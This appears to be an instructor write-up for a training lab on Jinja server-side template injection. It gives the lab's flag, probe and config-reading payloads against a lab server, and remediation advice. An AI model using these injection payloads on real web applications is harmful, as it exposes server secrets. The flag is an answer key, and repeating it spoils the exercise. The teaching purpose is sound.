# Instructor Write-up — NFSU SSTI Lab

## Challenge Name
TemplateNode — Server-Side Secrets

## Challenge Description
A training web server provides a dynamic message-rendering feature. Investigate how the server processes the supplied template input and retrieve the hidden challenge flag.

## Flag
`flag{nfsu_jinja_ssti_template_escape_2026}`

## Solution

1. Open `http://172.16.11.52:8090`.
2. Identify the `name` parameter used by `/render`.
3. Test SSTI with:

```text
{{7*7}}
```

4. Seeing `49` confirms server-side Jinja expression evaluation.
5. Retrieve the challenge flag with:

```text
{{ config["CHALLENGE_FLAG"] }}
```

6. The application returns:

```text
Welcome, flag{nfsu_jinja_ssti_template_escape_2026}!
```

## Remediation

Never compile untrusted input as a server-side template. Pass user input as data to a fixed template instead, for example:

```python
return render_template("result.html", name=expression)
```

and render it normally with `{{ name }}`. Also avoid exposing secrets through template context.
